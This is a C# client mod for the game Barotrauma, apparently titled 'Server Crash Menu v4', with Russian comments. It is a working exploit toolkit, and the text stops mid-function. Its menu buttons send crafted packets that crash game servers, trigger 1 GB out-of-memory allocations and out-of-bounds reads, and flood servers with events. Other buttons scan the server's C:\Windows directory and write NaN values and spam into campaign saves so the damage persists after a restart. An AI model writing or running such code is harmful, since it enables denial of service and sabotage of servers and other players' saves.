using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Reflection;
using Barotrauma;
using Barotrauma.Items.Components;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  SERVER CRASH MENU v4 (волна 598)
    //
    //  ПОЧЕМУ v3 «НЕ РАБОТАЛ» (разобрано по исходникам):
    //  • Сырые entity-пакеты: сервер SKIPает событие, если его ID не равен
    //    «ожидаеый+1» — а обычный геймплей постоянно двигает счётчик.
    //    Мой «зеркальный» ID был устаревшим → молчаливый скип.
    //    ФИКС: реальный счётчик через reflection (ClientEntityEventManager.ID)
    //    + окно из 40 последовательных ID (совпадение в середине окна =
    //    хвост ОБРАБАТЫВАЕТСЯ: до ~40 исполнений с одного пакета).
    //  • CircuitBox-эффекты теперь через ПРЯМЫЕ клиентские вызовы
    //    AddLabel/RenameLabel/AddWire — те же, что в РАБОЧЕМ Lua-скрипте:
    //    они сами создают серверные события с правильными ID.
    //  • DoS-пакеты уходили, но эффект на СОЛО невидим (батч-дроп глотается
    //    молча, лагать некому). Смотри лог сервера / тести на людном.
    //
    //  НОВОЕ: поле «СКОЛЬКО РАЗ» — глобальный счётчик отправок для EXEC.
    // ============================================================
    public class ServerCrashMenuModule : CSModuleBase
    {
        public override string Id   => "crash_menu";
        public override string Name => "Crash Menu";
        public override string Description =>
            "Краши/DoS/порча. v4: СКОЛЬКО РАЗ + рабочий путь ЦБ.\n\n" +
            "• «N раз» наверху — множитель для всех EXEC\n" +
            "• CIRCUIT BOX = прямые вызовы (как твой Lua):\n" +
            "  AddLabel/RenameLabel/AddWire сами синкуются\n" +
            "• [INSTANT] DescriptionTag = краш процесса\n" +
            "• DoS на соло невидим — эффект на людном сервере\n" +
            "• [SAVE] порча остаётся после рестарта!";

        public override string Category => "exploit";

        private static readonly Color OkColor    = new Color(120, 255, 140);
        private static readonly Color DangerColor= new Color(255, 110, 110);
        private static readonly Color AccentColor= new Color(255, 170, 90);
        private static readonly Color RowColor   = new Color(30, 36, 48);
        private static readonly Color SelColor   = new Color(90, 40, 40);
        private static readonly Color HeadColor  = new Color(45, 55, 75);

        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBlock _desc;
        private static GUITextBox _repeatBox;

        private class Method
        {
            public string Title;
            public string Desc;
            public Func<int, string> Exec; // аргумент = сколько раз
        }

        private static int _repeat = 100;

        private static readonly Method[] InstMethods = new Method[]
        {
            new Method
            {
                Title = "[INSTANT] DescriptionTag (сеттер)",
                Desc =
"Твой подтверждённый краш. EXEC: находит доступный предмет и\n" +
"ставит DescriptionTag локально — СЕТТЕР САМ шлёт событие\n" +
"(как Property Editor, которым ты валил сервер).\n\n" +
"Если сеттер задедуплен — жми второй метод (raw-пакет).\n" +
"N раз = предметов/попыток больше (берёт разные предметы).",
                Exec = ExecDescriptionTag
            },
            new Method
            {
                Title = "[INSTANT] DescriptionTag (raw + окно ID)",
                Desc =
"То же самое, но сырым ChangeProperty-событием с ОКНОМ ID:\n" +
"один пакет несёт N событий подряд — совпадение счётчика в\n" +
"середине = хвост ОБРАБАТЫВАЕТСЯ (до N исполнений).\n\n" +
"Работает даже если сеттер дедупнулся.",
                Exec = ExecDescriptionTagRaw
            },
            new Method
            {
                Title = "[CRASHLOOP] EventManager option=200",
                Desc =
"Смерть на следующем тике. ТОЛЬКО если событийный диалог\n" +
"(вопрос NPC) сейчас таргетит тебя. Иначе пакет игнор — это норм.",
                Exec = ExecEventManager
            }
        };

        private static readonly Method[] CircuitMethods = new Method[]
        {
            new Method
            {
                Title = "☣ LABEL FLOOD — создать N меток",
                Desc =
"Прямой вызов cb.AddLabel() × N — тот же, что в твоём\n" +
"РАБОЧЕМ Lua. Каждая метка = событие серверу, правильные ID.\n\n" +
"ЭФФЕКТ: сервер тащит N событий, метки ПЕРСИСТЯТСЯ в сейв\n" +
"(bloat кампании). Открой ЦБ (SelectedItem) и жми.\n" +
"N=10000 за раз — сервер захлёбывается обработкой.",
                Exec = ExecLabelFlood
            },
            new Method
            {
                Title = "☣ RENAME CHAOS — все метки",
                Desc =
"cb.RenameLabel() всех меток открытого ЦБ (как в Lua).\n" +
"Хедер/боди='HACKED', красный. Синхронизируется всем.\n\n" +
"Соц-гриф: чужой ЦБ, если тебе доступен.",
                Exec = ExecRenameChaos
            },
            new Method
            {
                Title = "☣ WIRE CHAOS — все пары связей",
                Desc =
"cb.AddWire() для КАЖДОЙ пары Input×Output (как в Lua).\n" +
"N² проводов = N×N событий + персистентный блоат сейва.\n\n" +
"10 инпутов × 10 аутпутов = 100 проводов ЗА РАЗ.\n" +
"N = сколько пар создать.",
                Exec = ExecWireChaos
            }
        };

        private static readonly Method[] DosMethods = new Method[]
        {
            new Method
            {
                Title = "[DOS] SoldItems: несуществующий префаб",
                Desc =
"Throw на самом верху кампейн-чтения, до всех проверок.\n" +
"×N = N пакетов. Эффект (лаг) виден на ЛЮДНОМ сервере.\n" +
"Условие: кампания.",
                Exec = ExecSoldPrefab
            },
            new Method
            {
                Title = "[DOS] EntityState: new byte[1ГБ]",
                Desc =
"msgLength=1ГБ → сервер аллоцирует до проверки буфера.\n" +
"Теперь с ОКНОМ ID (N событий в пакете) — попадает в счётчик.\n" +
"Условие: в раунде.",
                Exec = ExecEntityStateOom
            },
            new Method
            {
                Title = "[DOS] Inventory: start=0 end=255",
                Desc =
"Хирургически, с ОКНОМ ID: запись за границу receivedItemIds.\n" +
"Цель: ближайший контейнер. Условие: в раунде.",
                Exec = ExecInventoryOob
            },
            new Method
            {
                Title = "[DOS] CircuitBox NaN (MoveComponent)",
                Desc =
"С ОКНОМ ID: MoveAmount=NaN на узлы ЦБ. ★ ПЕРСИСТИТСЯ В СЕЙВ!\n" +
"Только своя тест-кампания!",
                Exec = ExecCircuitBoxNaN
            },
            new Method
            {
                Title = "[DOS] SegmentTable: битый указатель",
                Desc =
"4 байта, чтение таблицы за буфером. Без условий (лобби).",
                Exec = ExecSegmentTable
            },
            new Method
            {
                Title = "[DOS] CircuitBox: левый opcode",
                Desc =
"Прямой пакет с Opcode=AddComponent → throw свитча. Без условий.",
                Exec = ExecCircuitBox
            },
            new Method
            {
                Title = "[DOS] Чат: несуществующий ордер",
                Desc =
"Throw на OrderPrefab.Prefabs[id]. Из ЛОББИ тоже.",
                Exec = ExecChatOrder
            },
            new Method
            {
                Title = "[DOS] CharacterInput: count=255",
                Desc =
"255 инпутов, данных нет → OOB. Условие: в раунде.",
                Exec = ExecCharInput
            },
            new Method
            {
                Title = "[DOS] VOIP: пустые буферы",
                Desc =
"8×255 байт заявлено, 0 данных. Голос включён, не в муте.",
                Exec = ExecVoip
            },
            new Method
            {
                Title = "[DOS] Backup Indices: скан ФС",
                Desc =
"Сервер листает ЛЮБОЙ каталог + метаданные тебе. Спам = IO.",
                Exec = ExecBackupScan
            }
        };

        private static readonly Method[] SpecialMethods = new Method[]
        {
            new Method
            {
                Title = "[PERM-DOS] SelectMode: modeIndex 9999",
                Desc =
"GameModes[9999] OOB. Нужен перм SelectMode, иначе отказ.",
                Exec = ExecSelectMode
            },
            new Method
            {
                Title = "[WINDOW] LoadCampaign: мусорный файл",
                Desc =
"CAMPAIGN_SETUP_INFO с C:\\zzz_garbage.save. В окне 586/соло\n" +
"сервер попробует грузить мусор. Без окна — молчит.",
                Exec = ExecLoadGarbage
            },
            new Method
            {
                Title = "☣ ЗАФИКСИРОВАТЬ порчу (сейв кампании)",
                Desc =
"ManageRound(end=true, save=true): на дружелюбном аутпосте\n" +
"сервер СОХРАНЯЕТ текущее (замараенное NaN/метками) состояние\n" +
"В СЕЙВ навсегда. Соло/перм ManageRound/окно 586.\n\n" +
"★ Полный пайплайн: Crash Menu (NaN/метки) → эта кнопка →\n" +
"рестарт → кампания глючит/крашится. СВОЯ КАМПАНИЯ!",
                Exec = ExecForceSave
            }
        };

        public override string GetLabel() => "Crash Menu 💥";

        public override void OnClick()
        {
            if (_window != null) { CloseWindow(); return; }
            BuildWindow();
        }

        private static void BuildWindow()
        {
            try
            {
                _window = new GUIMessageBox("Server Crash Menu v4", "", Array.Empty<LocalizedString>(), new Vector2(0.82f, 0.92f));
                var content = _window.Content;
                content.ClearChildren();

                // ---- панель ПОВТОРОВ ----
                var repFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.07f), content.RectTransform, Anchor.TopCenter), style: null);
                repFrame.Color = new Color(60, 45, 30);
                var repLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.85f), repFrame.RectTransform, Anchor.Center), isHorizontal: true);
                var repLabel = new GUITextBlock(
                    new RectTransform(new Vector2(0.45f, 1f), repLayout.RectTransform),
                    "СКОЛЬКО РАЗ отправлять:", textAlignment: Alignment.CenterLeft);
                repLabel.TextColor = AccentColor;
                repLabel.CanBeFocused = false;
                var boxFrame = new GUIFrame(new RectTransform(new Vector2(0.3f, 1f), repLayout.RectTransform), style: null);
                _repeatBox = new GUITextBox(new RectTransform(Vector2.One, boxFrame.RectTransform), _repeat.ToString());
                var applyBtn = new GUIButton(new RectTransform(new Vector2(0.24f, 1f), repLayout.RectTransform), "OK");
                applyBtn.OnClicked = (b, d) => { ParseRepeat(); return true; };

                _list = new GUIListBox(new RectTransform(new Vector2(1f, 0.43f), content.RectTransform, Anchor.TopCenter)
                    { RelativeOffset = new Vector2(0f, 0.075f) });
                _list.Color = new Color(20, 25, 35);

                AddGroupHeader("☠ УБИВАЮТ ПРОЦЕСС", OkColor);
                AddMethods(InstMethods);
                AddGroupHeader("☣ CIRCUIT BOX — прямой API (работает!)", DangerColor);
                AddMethods(CircuitMethods);
                AddGroupHeader("⚠ DoS — лаг/десинк (соло невидим)", AccentColor);
                AddMethods(DosMethods);
                AddGroupHeader("🔧 ОСОБЫЕ", HeadColor);
                AddMethods(SpecialMethods);

                _desc = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.39f), content.RectTransform, Anchor.BottomCenter)
                        { RelativeOffset = new Vector2(0f, 0.05f) },
                    "EXEC × «сколько раз». Клик по названию = описание.", textAlignment: Alignment.CenterLeft);
                _desc.TextColor = AccentColor;
                _desc.CanBeFocused = false;
                try { _desc.Wrap = true; } catch { }
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] GUI fail: " + e.Message, DangerColor);
                CloseWindow();
            }
        }

        private static void ParseRepeat()
        {
            if (_repeatBox == null) { return; }
            int v;
            if (int.TryParse(_repeatBox.Text.Trim(), out v) && v > 0)
            {
                _repeat = Math.Min(v, 10000);
                _repeatBox.Text = _repeat.ToString();
                GUI.AddMessage("[CrashMenu] множитель = " + _repeat, AccentColor);
            }
        }

        private static void AddGroupHeader(string text, Color color)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.07f), _list.Content.RectTransform), style: null);
            row.Color = HeadColor;
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.CenterLeft);
            txt.TextColor = color;
            txt.CanBeFocused = false;
            AddSpacer();
        }

        private static void AddSpacer()
        {
            var gap = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.014f), _list.Content.RectTransform), style: null);
            gap.Color = new Color(15, 18, 26);
            gap.CanBeFocused = false;
        }

        private static void AddMethods(Method[] methods)
        {
            foreach (Method m in methods)
            {
                Method mm = m;
                var row = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.085f), _list.Content.RectTransform), style: null);
                row.Color = RowColor;
                var layout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.985f, 0.92f), row.RectTransform, Anchor.Center), isHorizontal: true);
                try { layout.RelativeSpacing = 0.008f; } catch { }

                var execBtn = new GUIButton(
                    new RectTransform(new Vector2(0.14f, 0.9f), layout.RectTransform), "EXEC ▶");
                execBtn.Color = SelColor;
                execBtn.OnClicked = (b, d) =>
                {
                    ParseRepeat();
                    ShowDesc(mm);
                    RunExec(mm);
                    return true;
                };

                var nameBtn = new GUIButton(
                    new RectTransform(new Vector2(0.85f, 0.9f), layout.RectTransform),
                    mm.Title, textAlignment: Alignment.CenterLeft);
                nameBtn.OnClicked = (b, d) => { ShowDesc(mm); return true; };

                AddSpacer();
            }
        }

        private static void ShowDesc(Method m)
        {
            if (_desc == null) { return; }
            _desc.Text = m.Title + " ×" + _repeat + "\n──────────────────────────────\n" + m.Desc;
            _desc.TextColor = AccentColor;
        }

        private static void RunExec(Method m)
        {
            try
            {
                string result = m.Exec(_repeat);
                GUI.AddMessage("[CrashMenu] " + result, OkColor);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CrashMenu] " + m.Title + ": " + e.Message, DangerColor);
            }
        }

        // ========================================================
        //  ХЕЛПЕРЫ
        // ========================================================
        private static bool CanSend() { return GameMain.Client?.ClientPeer != null; }
        private static bool InRound() { return GameMain.Client.GameStarted && Character.Controlled != null; }

        private static ushort CurrentLocIndex()
        {
            try
            {
                var map = GameMain.GameSession?.Campaign?.Map;
                if (map?.CurrentLocation != null)
                {
                    int idx = map.Locations.IndexOf(map.CurrentLocation);
                    if (idx >= 0) { return (ushort)idx; }
                }
            }
            catch { }
            return 0;
        }

        // Реальный счётчик событий клиента (private UInt16 ID) через reflection
        private static ushort RealNextEventId()
        {
            try
            {
                var em = GameMain.Client.EntityEventManager;
                if (em != null)
                {
                    var f = typeof(ClientEntityEventManager).GetField("ID",
                        BindingFlags.NonPublic | BindingFlags.Instance);
                    if (f != null)
                    {
                        object v = f.GetValue(em);
                        if (v is ushort u) { return (ushort)(u + 1); }
                        if (v is int i) { return (ushort)(i + 1); }
                    }
                }
            }
            catch { }
            try { return (ushort)(GameMain.Client.LastSentEntityEventID + 1); } catch { }
            return 0;
        }

        // Корректная сборка: тело пишем внутри using
        private static string SendSweep(ushort entityId, IWriteMessage payload, int count)
        {
            count = Math.Max(1, Math.Min(count, 40));
            ushort start = (ushort)(RealNextEventId() - 8);

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                msg.WritePadBits();
                msg.WriteUInt16(start);
                msg.WriteByte((byte)count);
                for (int i = 0; i < count; i++)
                {
                    msg.WriteUInt16(entityId);
                    msg.WriteVariableUInt32((uint)(payload.LengthBytes + 2));
                    msg.WriteUInt16(0);
                    msg.WriteBytes(payload.Buffer, 0, payload.LengthBytes);
                }
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "сweep " + count + "× (start=" + start + ")";
        }

        private static Item SelectedOrNearestCircuitBox(out CircuitBox cb)
        {
            cb = null;
            Character me = Character.Controlled;
            Item item = null;
            try
            {
                if (me?.SelectedItem != null)
                {
                    CircuitBox c = null;
                    try { c = me.SelectedItem.GetComponent<CircuitBox>(); } catch { }
                    if (c != null) { item = me.SelectedItem; cb = c; }
                }
            }
            catch { }
            if (item != null) { return item; }

            float bestD = 600f;
            if (me == null) { return null; }
            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                CircuitBox c = null;
                try { c = it.GetComponent<CircuitBox>(); } catch { }
                if (c == null) { continue; }
                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                if (d < bestD) { bestD = d; item = it; cb = c; }
            }
            return item;
        }

        // ========================================================
        //  [INSTANT] DescriptionTag через сеттер
        // ========================================================
        private static string ExecDescriptionTag(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Character me = Character.Controlled;
            int done = 0;
            var tried = new HashSet<ushort>();
            foreach (Item it in me.HeldItems) { if (TryTag(it, tried)) { done++; } }
            if (me.Inventory != null)
            {
                foreach (Item it in me.Inventory.AllItemsMod) { if (TryTag(it, tried)) { done++; } }
            }
            if (done == 0)
            {
                Item near = null; float bd = 300f;
                foreach (Item it in Item.ItemList)
                {
                    if (it == null || it.Removed || tried.Contains(it.ID)) { continue; }
                    float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                    if (d < bd) { bd = d; near = it; }
                }
                if (near != null && TryTag(near, tried)) { done++; }
            }
            return done > 0
                ? "DescriptionTag выставлен на " + done + " предмет(ов) — сервер должен умереть"
                : "доступный предмет не найден";
        }

        private static bool TryTag(Item it, HashSet<ushort> tried)
        {
            if (it == null || it.Removed || !tried.Add(it.ID)) { return false; }
            try
            {
                it.DescriptionTag = "zzz_crash_tag_test";
                return true;
            }
            catch { return false; }
        }

        // ========================================================
        //  [INSTANT] DescriptionTag raw + sweep
        // ========================================================
        private static string ExecDescriptionTagRaw(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Character me = Character.Controlled;
            Item target = null;
            foreach (Item it in me.HeldItems) { if (it != null && !it.Removed) { target = it; break; } }
            if (target == null && me.Inventory != null)
            {
                foreach (Item it in me.Inventory.AllItemsMod) { if (it != null && !it.Removed) { target = it; break; } }
            }
            if (target == null) { return "предмет не найден"; }

            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(3, 0, 12);                       // ChangeProperty
            payload.WriteIdentifier("DescriptionTag".ToIdentifier());
            payload.WriteString("zzz_crash_tag_raw");
            SendSweep(target.ID, payload, Math.Min(n, 40));
            return "raw ChangeProperty ×" + Math.Min(n, 40) + " на " + target.Name;
        }

        private static string ExecEventManager(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            for (int i = 0; i < Math.Min(n, 50); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
                msg.WriteUInt16(0x7FFF);
                msg.WriteByte(200);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            }
            return "EVENTMANAGER ×" + Math.Min(n, 50) + " (сработает при активном диалоге)";
        }

        // ========================================================
        //  ☣ CIRCUIT BOX: прямой API (как рабочий Lua)
        // ========================================================
        private static string ExecLabelFlood(int n)
        {
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }

            int created = 0;
            var rand = new Random();
            n = Math.Min(n, 10000);
            for (int i = 0; i < n; i++)
            {
                try
                {
                    cb.AddLabel(new Vector2(rand.Next(-5000, 5000), rand.Next(-5000, 5000)));
                    created++;
                }
                catch { break; }
            }
            return "LABEL FLOOD: " + created + " меток на «" + item.Name + "» (персистятся в сейв!)";
        }

        private static string ExecRenameChaos(int n)
        {
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }

            int renamed = 0;
            try
            {
                int i = 0;
                foreach (CircuitBoxLabelNode label in cb.Labels)
                {
                    if (label == null) { continue; }
                    i++;
                    try
                    {
                        cb.RenameLabel(label, new Color(255, 0, 0, 255),
                            new NetLimitedString("HACKED#" + i),
                            new NetLimitedString("System compromised!"));
                        renamed++;
                        if (renamed >= n) { break; }
                    }
                    catch { }
                }
            }
            catch (Exception e) { return "rename fail: " + e.Message; }
            return "RENAME CHAOS: " + renamed + " меток в «" + item.Name + "»";
        }

        private static string ExecWireChaos(int n)
        {
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }

            int created = 0;
            int cap = Math.Min(n, 2000);
            try
            {
                for (int i = 0; i < cb.Inputs.Length && created < cap; i++)
                {
                    for (int j = 0; j < cb.Outputs.Length && created < cap; j++)
                    {
                        try
                        {
                            cb.AddWire(cb.Inputs[i], cb.Outputs[j]);
                            created++;
                        }
                        catch { }
                    }
                }
            }
            catch (Exception e) { return "wire fail: " + e.Message; }
            return "WIRE CHAOS: " + created + " проводов на «" + item.Name + "» (персистятся!)";
        }

        // ========================================================
        //  [DOS] методы
        // ========================================================
        private static string ExecSoldPrefab(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (GameMain.GameSession?.Campaign == null) { return "нужна кампания"; }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 500); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
                msg.WriteUInt16((ushort)ClientPermissions.ManageCampaign);
                ushort loc = CurrentLocIndex();
                msg.WriteUInt16(loc);
                msg.WriteUInt16(loc);
                msg.WriteByte(0);
                msg.WriteBoolean(false);
                msg.WriteBoolean(false);
                msg.WriteBoolean(false);
                msg.WriteByte(0);
                msg.WriteByte(0);
                msg.WriteByte(0);
                msg.WriteByte(1);
                msg.WriteIdentifier("a".ToIdentifier());
                msg.WriteUInt16(1);
                msg.WriteIdentifier("zzz_nonexistent_prefab".ToIdentifier());
                msg.WriteUInt16(0);
                msg.WriteBoolean(false);
                msg.WriteByte(0);
                msg.WriteByte(0);
                msg.WriteUInt16(0);
                msg.WriteUInt16(0);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "SoldItems-бомба ×" + sent;
        }

        private static string ExecEntityStateOom(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            ushort myId = Character.Controlled.ID;

            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(true);
            msg.WritePadBits();
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                msg.WritePadBits();
                msg.WriteUInt16(RealNextEventId());
                msg.WriteByte((byte)Math.Min(n, 255));
                for (int i = 0; i < Math.Min(n, 255); i++)
                {
                    msg.WriteUInt16(myId);
                    msg.WriteVariableUInt32(0x40000000u);
                    msg.WriteUInt16(0);
                }
            }
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "OOM ×" + Math.Min(n, 255) + " в одном пакете";
        }

        private static string ExecInventoryOob(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Character me = Character.Controlled;
            Item container = null; float bd = 400f;
            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                bool isC = false;
                try { isC = it.GetComponent<ItemContainer>() != null; } catch { }
                if (!isC) { continue; }
                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
                if (d < bd) { bd = d; container = it; }
            }
            if (container == null) { return "рядом нет контейнера"; }

            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(1, 0, 12);                       // InventoryState
            int comps = 1;
            try { comps = Math.Max(1, container.Components.Count); } catch { }
            payload.WriteRangedInteger(0, 0, comps - 1);
            payload.WriteByte(0);
            payload.WriteByte(255);
            for (int i = 0; i < 96; i++) { payload.WriteByte(0); }

            SendSweep(container.ID, payload, Math.Min(Math.Max(n, 1), 40));
            return "Inventory-бомба на «" + container.Name + "»";
        }

        private static string ExecCircuitBoxNaN(int n)
        {
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
            if (item == null || cb == null) { return "нет circuit box"; }

            var ids = new List<ushort>();
            try
            {
                foreach (CircuitBoxComponent comp in cb.Components)
                {
                    if (comp != null && comp.ID != ICircuitBoxIdentifiable.NullComponentID) { ids.Add(comp.ID); }
                }
            }
            catch { }
            if (ids.Count == 0) { return "в цепи нет компонентов"; }

            int cbIndex = 0;
            try
            {
                for (int i = 0; i < item.Components.Count; i++)
                {
                    if (item.Components[i] is CircuitBox) { cbIndex = i; break; }
                }
            }
            catch { }

            IWriteMessage payload = new WriteOnlyMessage();
            payload.WriteRangedInteger(0, 0, 12);
            int comps = Math.Max(1, item.Components.Count);
            payload.WriteRangedInteger(cbIndex, 0, comps - 1);
            payload.WriteByte((byte)CircuitBoxOpcode.MoveComponent);
            CircuitBoxMoveComponentEvent move = new CircuitBoxMoveComponentEvent(
                ImmutableArray.Create<ushort>(ids.ToArray()),
                ImmutableArray.Create<CircuitBoxInputOutputNode.Type>(),
                ImmutableArray.Create<ushort>(ids.ToArray()),
                new Vector2(float.NaN, float.NaN));
            ((INetSerializableStruct)move).Write(payload);

            SendSweep(item.ID, payload, Math.Min(Math.Max(n, 1), 40));
            return "NaN ×" + ids.Count + " узлов «" + item.Name + "» ★ СЕЙВ!";
        }

        private static string ExecSegmentTable(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 1000); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
                msg.WriteInt32(int.MaxValue);
                msg.WriteUInt16(0);
                msg.WriteUInt16(0);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "SegmentTable ×" + sent;
        }

        private static string ExecCircuitBox(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            for (int i = 0; i < Math.Min(n, 500); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.CIRCUITBOX);
                INetSerializableStruct header = new NetCircuitBoxHeader((CircuitBoxOpcode)2, 1, 0);
                header.Write(msg);
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            }
            return "CircuitBox opcode ×" + Math.Min(n, 500);
        }

        private static string ExecChatOrder(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            int typeMax = Enum.GetValues(typeof(ChatMessageType)).Length - 1;
            int modeMax = Enum.GetValues(typeof(ChatMode)).Length - 1;
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 1000); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.ChatMessage);
                    msg.WriteUInt16((ushort)(i + 1));
                    msg.WriteRangedInteger((int)ChatMessageType.Order, 0, typeMax);
                    msg.WriteRangedInteger((int)ChatMode.None, 0, modeMax);
                    msg.WriteIdentifier("zzz_nonexistent_order".ToIdentifier());
                    msg.WriteUInt16(0);
                    msg.WriteUInt16(0);
                    msg.WriteByte(0);
                }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "ORDER ×" + sent;
        }

        private static string ExecCharInput(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 500); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
                msg.WriteBoolean(true);
                msg.WritePadBits();
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.CharacterInput);
                    msg.WriteUInt16((ushort)(i + 1));
                    msg.WriteByte(255);
                }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "Input ×" + sent;
        }

        private static string ExecVoip(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            byte mySession = 0;
            try { mySession = GameMain.Client.SessionId; } catch { }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 1000); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.VOICE);
                msg.WriteByte(mySession);
                for (int j = 0; j < 8; j++) { msg.WriteByte(255); }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Unreliable);
                sent++;
            }
            return "VOIP ×" + sent;
        }

        private static string ExecBackupScan(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            int sent = 0;
            for (int i = 0; i < Math.Min(n, 200); i++)
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.REQUEST_BACKUP_INDICES);
                msg.WriteString("C:\\Windows");
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                sent++;
            }
            return "Скан ФС ×" + sent;
        }

        private static string ExecSelectMode(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
            msg.WriteUInt16((ushort)ClientPermissions.SelectMode);
            msg.WriteUInt16(9999);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "SelectMode 9999 отправлен";
        }

        private static string ExecLoadGarbage(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.CAMPAIGN_SETUP_INFO);
            msg.WriteBoolean(false);
            msg.WritePadBits();
            msg.WriteString("C:\\zzz_garbage_nonexistent.save");
            msg.WriteBoolean(false);
            msg.WritePadBits();
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "LoadCampaign мусор отправлен";
        }

        private static string ExecForceSave(int n)
        {
            if (!CanSend()) { return "нет подключения"; }
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
